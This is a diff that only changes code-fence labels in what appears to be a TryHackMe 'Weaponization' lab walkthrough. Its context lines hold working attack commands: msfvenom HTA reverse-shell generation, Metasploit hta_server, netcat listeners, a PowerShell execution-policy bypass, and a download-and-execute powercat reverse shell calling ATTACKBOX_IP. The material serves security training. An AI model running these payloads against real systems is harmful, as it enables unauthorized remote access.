@@ -61,7 +61,7 @@ If you prefer to connect through the Remote Desktop Protocol (RDP), first make s
 To connect via xfreerdp use the following command:
 
  Terminal
-```Terminal 
+```bash
 user@machine$ xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3 +clipboard
 ```
 
@@ -109,14 +109,14 @@ We create an object of the WScript library using CreateObject to call the execut
 To execute the vbs file, we can run it using the wscript as follows,
 
  Terminal
-```Terminal 
+```bash
 c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
 ```
 
  We can also run it via cscript as follows,
 
  Terminal
-```Terminal 
+```bash
 c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
 ```
 
@@ -127,7 +127,7 @@ As a result, the Windows calculator will appear on the Desktop.
  Another trick. If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows,
 
  Terminal
-```Terminal 
+```bash
 c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
 ```
 
@@ -170,7 +170,7 @@ In the following example, we will use an [ActiveXObject](https://en.wikipedia.or
 Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,
 
  Terminal
-```Terminal 
+```bash
 user@machine$ python3 -m http.server 8090
 Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
 ```
@@ -194,7 +194,7 @@ Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
 We can create a reverse shell payload as follows,
 
  Terminal
-```Terminal 
+```bash
 user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -211,7 +211,7 @@ On the attacking machine, we need to listen to the port 443 using nc. Please not
 Once the victim visits the malicious URL and hits run, we get the connection back.
 
  Terminal
-```Terminal 
+```bash
 user@machine$ sudo nc -lvp 443
 listening on [any] 443 ...
 10.8.232.37: inverse host lookup failed: Unknown host
@@ -239,7 +239,7 @@ Ethernet adapter Ethernet 4:
 There is another way to generate and serve malicious HTA files using the Metasploit framework. First, run the Metasploit framework using msfconsole -q command. Under the exploit section, there is exploit/windows/misc/hta_server, which requires selecting and setting information such as LHOST, LPORT, SRVHOST, Payload, and finally, executing exploit to run the module.
 
  Terminal
-```Terminal 
+```bash
 msf6 > use exploit/windows/misc/hta_server
 msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
 LHOST => 10.8.232.37
@@ -261,7 +261,7 @@ msf6 exploit(windows/misc/hta_server) >
  On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.
 
  Terminal
-```Terminal 
+```bash
 user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload
 [*] Sending stage (175174 bytes) to 10.10.201.254
 [*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
@@ -438,7 +438,7 @@ Write-Output "Welcome to the Weaponization Room!"
  Save the file as thm.ps1. With the Write-Output, we print the message "Welcome to the Weaponization Room!" to the command prompt. Now let's run it and see the result.
 
  CMD
-```CMD 
+```bash
 C:\Users\thm\Desktop>powershell -File thm.ps1
 File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
 information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
@@ -455,7 +455,7 @@ PowerShell's execution policy is a security option to protect the system from ru
 You can determine the current PowerShell setting of your Windows as follows,
 
  CMD
-```CMD 
+```bash
 PS C:\Users\thm> Get-ExecutionPolicy
 Restricted
 ```
@@ -463,7 +463,7 @@ Restricted
  We can also easily change the PowerShell execution policy by running:
 
  CMD
-```CMD 
+```bash
 PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
 
 Execution Policy Change
@@ -482,7 +482,7 @@ Microsoft provides ways to disable this restriction. One of these ways is by giv
 In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows,
 
 CMD
-```CMD 
+```bash
 C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
 Welcome to Weaponization Room!
 ```
@@ -490,7 +490,7 @@ Welcome to Weaponization Room!
  Now, let's try to get a reverse shell using one of the tools written in PowerShell, which is powercat. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.
 
    Terminal 
-```Terminal 
+```bash
 user@machine$ git clone https://github.com/besimorhino/powercat.git
 Cloning into 'powercat'...
 remote: Enumerating objects: 239, done.
@@ -504,7 +504,7 @@ Resolving deltas: 100% (72/72), done.
    Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port 8080.
 
   Terminal 
-```Terminal 
+```bash
 user@machine$ cd powercat
 user@machine$ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
@@ -513,21 +513,21 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
    On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim.
 
   Terminal 
-```Terminal 
+```bash
 user@machine$ nc -lvp 1337
 ```
 
    Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows,
 
    Terminal 
-```Terminal 
+```bash
 C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
 ```
 
    Now that we have executed the command above, the victim machine downloads the powercat.ps1  payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe and sends a connection back to the AttackBox that is listening on port 1337. After a couple of seconds, we should receive the connection call back:
 
    Terminal 
-```Terminal 
+```bash
 user@machine$ nc -lvp 1337  listening on [any] 1337 ...
 10.10.12.53: inverse host lookup failed: Unknown host
 connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
@@ -658,7 +658,7 @@ The web application allows uploading payloads as VBS, DOC, PS1 files. In additio
 In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate. In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow,
 
  Terminal
-```Terminal 
+```bash
 meterpreter > run post/windows/manage/migrate 
 
 [*] Running module against DESKTOP-1AU6NT4
